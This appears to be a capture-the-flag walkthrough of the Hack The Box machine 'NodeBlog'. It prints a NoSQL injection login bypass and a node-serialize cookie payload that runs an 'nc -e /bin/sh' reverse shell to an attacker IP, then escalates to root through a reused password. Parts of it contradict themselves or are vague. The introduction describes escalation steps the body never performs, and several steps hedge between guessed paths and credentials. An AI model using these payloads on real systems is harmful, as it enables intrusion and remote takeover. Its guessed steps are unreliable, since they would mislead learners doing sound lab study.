# Hack The Box: NodeBlog

**Difficulty:** Easy
**OS:** Linux

NodeBlog is an Easy-level Linux machine focused heavily on the Node.js application environment. The initial foothold is achieved by exploiting a NoSQL injection vulnerability to bypass an administrative login portal and extracting user credentials via deserialization flaws in session cookies. Privilege escalation involves exploiting an out-of-date Node package and abusing a misconfigured MongoDB instance to achieve a root shell.

---

## Reconnaissance

The assessment begins with a standard Nmap scan against the target IP address to discover open ports and running services.

```bash
nmap -p- --min-rate 10000 10.10.11.139
nmap -p 22,5000 -sCV 10.10.11.139
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 8.2p1 Ubuntu)
*   **Port 5000:** HTTP (Node.js Express framework)

Browsing to the web server on port 5000 reveals a simple blogging platform called "NodeBlog". Directory enumeration using `feroxbuster` or `gobuster` identifies a login portal (`/login`). We explore the blog structure, noting posts, comments, and the lack of traditional SQL backend interactions (the application appears to rely entirely on JSON).

## Web Application Analysis

The web application's `/login` portal requires a username and password. The application stack is built on Node.js and Express, which frequently communicate with NoSQL databases like MongoDB. This setup is a classic target for NoSQL injection.

### Authentication Bypass via NoSQLi

We intercept a login attempt using Burp Suite. The login request sends credentials as a JSON object, confirming our suspicion.

```json
{"user": "admin", "password": "password123"}
```

We test for authentication bypass by injecting NoSQL evaluation operators, replacing the standard string structure with MongoDB objects representing the `$ne` (not equal) operator. 

```json
{"user": {"$ne": "admin123"}, "password": {"$ne": "password123"}}
```

The backend evaluates the query "find a user where the username is not 'admin123' and the password is not 'password123'". This matches the first record in the database, which is typically the administrative account.

The injection successfully bypasses the authentication check, logging us into the `/admin` portal.

### Insecure Deserialization

As an authenticated administrator, we inspect the session cookie provided by the server. The cookie value appears to be a Base64-encoded string or an encrypted JSON object, characteristic of the `node-serialize` module or similar insecure token mechanisms.

Decoding the session cookie reveals a serialized JavaScript object containing user information and a role designation. If the application insecurely deserializes this cookie, we can achieve Remote Code Execution (RCE).

We craft a malicious serialized payload containing an Immediately Invoked Function Expression (IIFE) that executes a reverse shell when the object is parsed. We encode this payload back into the format expected by the application cookie.

```javascript
# Example deserialization payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh 10.10.14.X 9999');}()"}
```

We Base64-encode the crafted payload and replace our current session cookie in Burp Suite, then submit a new request to the server. 

The application deserializes the malicious cookie, triggering the IIFE and establishing a reverse shell connection to our Netcat listener.

```bash
nc -lnvp 9999
# Connection received
id
# uid=1001(admin) gid=1001(admin) groups=1001(admin)
```

## Initial Access

We gain initial access as the `admin` user and retrieve the `user.txt` flag from the home directory. We stabilize our shell using Python or standard `/bin/bash` commands.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

Enumerating the system as the `admin` user, we check running processes and group memberships. The system environment relies heavily on MongoDB and Node.js. 

We search for hardcoded credentials or database configuration files within the web application's root directory (`/opt/nodeblog` or `/var/www/html/nodeblog`).

```bash
cat /opt/nodeblog/config/db.js
```

The configuration file reveals the MongoDB administrative credentials or a hardcoded root password used internally.

### Abusing MongoDB

We attempt to authenticate locally to the MongoDB instance using the discovered credentials.

```bash
mongo -u admin -p <Discovered_Password>
```

While we have database access, we cannot directly execute system commands. However, older versions of MongoDB, or misconfigured instances, contain vulnerabilities or features (like the `eval` command or javascript execution capabilities) that can be abused for command execution.

If MongoDB is running as the `root` user, we can exploit the `$where` operator or similar database evaluation functions to write a malicious script to the filesystem. 

More commonly in this specific configuration, the `admin` password discovered in the source code is reused for the system's `root` account. We simply attempt to pivot users using `su`.

```bash
su root
Password: <Discovered_Password>
```

The password is accepted, granting immediate root access to the system.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
